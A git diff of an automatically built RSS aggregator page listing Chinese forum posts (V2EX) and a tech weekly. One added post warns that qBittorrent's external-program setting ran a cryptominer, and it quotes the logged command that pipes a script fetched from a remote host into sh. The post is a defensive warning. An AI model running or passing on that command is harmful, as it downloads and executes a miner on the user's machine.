@@ -22,8 +22,8 @@
             data-action="toggle-accordions"
             title="Click to toggle the day, Ctrl + click to toggle all."
           >
-            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2025-01-16 datetime="2025-01-16T19:15:11.000Z">2025-01-16</time>
-            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2025-01-16 datetime="2025-01-16T19:15:11.000Z"></time>
+            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2025-01-17 datetime="2025-01-17T00:28:47.000Z">2025-01-17</time>
+            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2025-01-17 datetime="2025-01-17T00:28:47.000Z"></time>
           </button>
         </h2>
         <ul class="sources card">
@@ -38,6 +38,177 @@
                   <a class="source-heading__link" href="https://www.v2ex.com/">Open</a>
                 </h3>
                 <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.v2ex.com/t/1105709"
+                        open
+                      >
+                        <summary class="article-expander__title">要注意， qBittorrent 自动运行 torrent 传播的挖矿脚本</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105709">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>Sanarara: - 在昨天下班回家后，听见 nas 怪吵，看了下探针 CPU50%，检查进程，qbittorrent 进程极为活跃，但是没有正在下载的内容。平时一直用 rss 自动挂 sukebei ，确认过确实没有活跃任务，这就活见鬼了。
+- ssh 中 top 了一下，b3qmud4h 这个进程跑的飞起，怀疑有问题，互联网上搜索一圈，b3qmud4h 为自动生成的字段。
+- kill -9 该进程后，cpu 恢复正常，qb 服务也没出现问题
+- 重启 qbittorrent ，再次出现高 cpu 占用进程，同样为随机字符的任务。
+- 检查 qbittorrent 日志，发现  “运行外部程序。Torrent：“*********”。命令：&#x60;sh -c &quot;(curl -skL https://files.synotech.studio || wget --no-check-certificate -qO - https://files.synotech.studio) | sh&quot;&#x60;”
+- 通过搜索，得知设置→下载→运行外部程序 选项如果打勾的话，是可以通过种子直接运行脚本的
+- 大家务必检查一下这个设置是否开启，我的印象里是没有认为开启过，可能和包或者是 docker 镜像有关</span>
+                                &ensp;<span class="article-reading-time">(&hairsp;3
+                                  min&hairsp;)</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.v2ex.com/t/1105708"
+                        open
+                      >
+                        <summary class="article-expander__title">n1 盒子 u 盘装完 armbian 为啥拔了 u 盘回进安卓系统的恢复模式啊？</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105708">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>um6uih: 我装完 armbian 也运行了安装到 emmc 的命令，armbian-install ，也有进度，最后说成功了，让我拔出 u 盘，poweroff ，然后开机
+等开机就进安卓那个绿色的小人的恢复模式，试了三次了都是这样
+有没有大佬知道这是啥原因？</span>
+                                &ensp;<span class="article-reading-time">(&hairsp;1
+                                  min&hairsp;)</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >阮一峰的网络日志</button>
+                  <a class="source-heading__link" href="http://www.ruanyifeng.com/blog/">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html"
+                        open
+                      >
+                        <summary class="article-expander__title">科技爱好者周刊（第 334 期）：年终笔记四则</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="http://www.ruanyifeng.com/blog/2025/01/weekly-issue-334.html">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>这里记录每周值得分享的科技内容，周五发布。
+本杂志开源，欢迎投稿。另有《谁在招人》服务，发布程序员招聘信息。合作请邮件联系（yifeng.ruan@gmail.com）。
+封面图
+
+武汉光谷是今年春节晚会的分会场，将表演灯光秀，非常有科幻感。（via）
+年终笔记四则
+下面是过去的笔记，我读到有意思的文章时，记录下来的感想，每一则都不长。
+前几天翻阅，觉得可以放在一起，重新发布，今天先发四则。
+一、工作也有利息
+银行存款有利息，存得越久，利息越多。
+工作也是一样，也有利息。如果今年的工作可以节省明年或未来的工作时间，就是一份有利息的工作。
+
+工作有利息，意味着你未来的工作时间会变少，多出来的时间，就可以去做别的事情，创造更多的价值。
+这提示我们：
+（1）不要轻易更换工作领域，否则以前积累的利息就作废了。只有在同一个工作领域，才可能产生长期积累，以前的工作为以后打基础，最终产生巨大的利息。
+（2）在职业生涯的早期，积累效果最好，最容易产生复利。开始积累越晚，产生复利就越少。
+（3）有些劳动没有积累效果，不会产生利息，比如重复性的机械劳动（快递、咖啡店员、门卫......），你明年还是要重复做这些事情。
+（4）最好的人生策略就是，找到你深感兴趣、可以长期做下去的领域，在上面投入大量的工作时间（包括质量和数量），然后随着年龄增长，享受以前工作的复利。
+二、巴菲特的选人标准
+巴菲特说，他考察候选人，就看三个&quot;i&quot;。
+
+integrity（正直）
+intelligence（智慧）
+initiative（主动）
+这三个&quot;i&quot;当中，&quot;主动&quot;最重要。&quot;正直&quot;和&quot;智慧&quot;的人到处都是，但如果不主动，不是自己想去做些什么，就什么也不会发生。
+三、快乐机
+1974年，一个美国哲学家提出一个假设，如果世界上有&quot;快乐机&quot;，只要插上电源，就能带来源源不断的快乐，并且无法分辨，这种机器快乐与现实世界的快乐有…</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+        </ul>
+      </section>
+      <section class="daily-content js-toggle-accordions-scope">
+        <h2 class="daily-heading">
+          <button
+            class="daily-heading-toggle"
+            data-action="toggle-accordions"
+            title="Click to toggle the day, Ctrl + click to toggle all."
+          >
+            <time class="daily-heading-toggle__weekday js-offset-weekday" data-offset-date=2025-01-16 datetime="2025-01-16T23:25:49.000Z">2025-01-16</time>
+            <time class="daily-heading-toggle__date js-offset-date" data-offset-date=2025-01-16 datetime="2025-01-16T23:25:49.000Z"></time>
+          </button>
+        </h2>
+        <ul class="sources card">
+            <li class="card__section">
+              <section class="js-toggle-accordions-scope">
+                <h3 class="source-heading">
+                  <button
+                    class="source-heading__name"
+                    data-action="toggle-accordions"
+                    title="Click to toggle the source, Ctrl + click to toggle all."
+                  >V2EX-最新主题</button>
+                  <a class="source-heading__link" href="https://www.v2ex.com/">Open</a>
+                </h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.v2ex.com/t/1105707"
+                        open
+                      >
+                        <summary class="article-expander__title">支付宝这次的 Bug 有点严重啊</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105707">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>roundRobin: 
+所有订单都减 20%，，这得多离谱才能让这个功能上线。不过在实名制下是不是都得算不当得利被追回？
+ref: https://www.guancha.cn/politics/2025_01_16_762334.shtml</span>
+                                &ensp;<span class="article-reading-time">(&hairsp;2
+                                  min&hairsp;)</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
+                    <article>
+                      <details
+                        class="article-expander"
+                        data-action="toggle-native-accordion"
+                        data-accordion-key="https://www.v2ex.com/t/1105706"
+                        open
+                      >
+                        <summary class="article-expander__title">现在日本有什么好买的？</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105706">
+                          <div class="article-summary-box-inner media-object">
+                            <span class="media-object__text">
+                              <span>licong: 人在京都，大阪准备最后一天回去的时候去逛一下</span>
+                                &ensp;<span class="article-reading-time">(&hairsp;1
+                                  min&hairsp;)</span>
+                            </span>
+                          </div>
+                        </a>
+                      </details>
+                    </article>
                     <article>
                       <details
                         class="article-expander"
@@ -102,7 +273,7 @@ https://www.facebook.com/davidlynchofficial/posts/pfbid04LuZED6SrWevszQ1UZoEED6x
 微博原文链接： https://weibo.com/1891502860/5123605060913184
 https://i.imgur.com/GAeYk7N.jpeg
 https://i.imgur.com/cPSb8II.jpeg</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
+                                &ensp;<span class="article-reading-time">(&hairsp;2
                                   min&hairsp;)</span>
                             </span>
                           </div>
@@ -311,7 +482,7 @@ https://trumandu.top/2024-summary
 •寻找共鸣的你：当下的你或许孤独，但这些文字会告诉你，你并不孤单。
 未来，从共鸣开始
 在这里，每一次随机都是与人心的一次对话，每一次阅读都是对自我的一次探索。2024 年即将过去，但它的故事仍在延续。感受这片文字的温度吧！</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
+                                &ensp;<span class="article-reading-time">(&hairsp;2
                                   min&hairsp;)</span>
                             </span>
                           </div>
@@ -548,7 +719,7 @@ https://trumandu.top/2024-summary
                             <span class="media-object__text">
                               <span>kirieievk: 
 否则还要跑一趟麻烦. 为啥规定只能 90 天以内.</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
+                                &ensp;<span class="article-reading-time">(&hairsp;2
                                   min&hairsp;)</span>
                             </span>
                           </div>
@@ -845,68 +1016,6 @@ https://upsidedowntext.vip</span>
 想先买个无线或者蓝牙的耳机，然后换个蓝牙键鼠。
 这样就清爽一些了
 谢谢大家的推荐！性价比高点最好 越便宜越好 就是上班摸鱼听小说用</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
-                                  min&hairsp;)</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://www.v2ex.com/t/1105658"
-                        open
-                      >
-                        <summary class="article-expander__title">工行追加贷有什么坑</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105658">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>qqqtz: 追加贷（纯信用）
-额度:10 － 50 万
-还款方式:等额，先息
-年限:等额 8 年，先息 3 － 5 年
-月利息:1.63 厘（ 10 万元一个月利息 163 元）</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
-                                  min&hairsp;)</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://www.v2ex.com/t/1105657"
-                        open
-                      >
-                        <summary class="article-expander__title">3599 的 Mac mini 4 丐版好像很容易买到？</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105657">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>wsping: 
-京东预约了下，随便就买到了。</span>
-                                &ensp;<span class="article-reading-time">(&hairsp;1
-                                  min&hairsp;)</span>
-                            </span>
-                          </div>
-                        </a>
-                      </details>
-                    </article>
-                    <article>
-                      <details
-                        class="article-expander"
-                        data-action="toggle-native-accordion"
-                        data-accordion-key="https://www.v2ex.com/t/1105656"
-                        open
-                      >
-                        <summary class="article-expander__title">网格员们开始查房扰民了</summary>
-                        <a class="article-summary-link article-summary-box-outer" href="https://www.v2ex.com/t/1105656">
-                          <div class="article-summary-box-inner media-object">
-                            <span class="media-object__text">
-                              <span>ocsp: 位置深圳，前天刚上门刷过身份证查过房，今天换个人来又敲门，不要太搞笑。。</span>
                                 &ensp;<span class="article-reading-time">(&hairsp;1
                                   min&hairsp;)</span>
                             </span>
@@ -2216,8 +2325,8 @@ How to Create Multi-Step Forms With Vanilla JavaScript and CSS originally publis
       </section>
 
     <footer>
-      <a class="footer-link" href="https://github.com/LavaCxx/gh-rss/actions/runs/12820410560">
-        <time id="build-timestamp" datetime="2025-01-17T00:51:15.116Z">2025-01-17T00:51:15.116Z</time>
+      <a class="footer-link" href="https://github.com/LavaCxx/gh-rss/actions/runs/12821283300">
+        <time id="build-timestamp" datetime="2025-01-17T02:08:23.193Z">2025-01-17T02:08:23.193Z</time>
       </a>
       <a class="footer-link" href="https://github.com/osmoscraft/osmosfeed">osmosfeed 1.15.1</a>
     </footer>
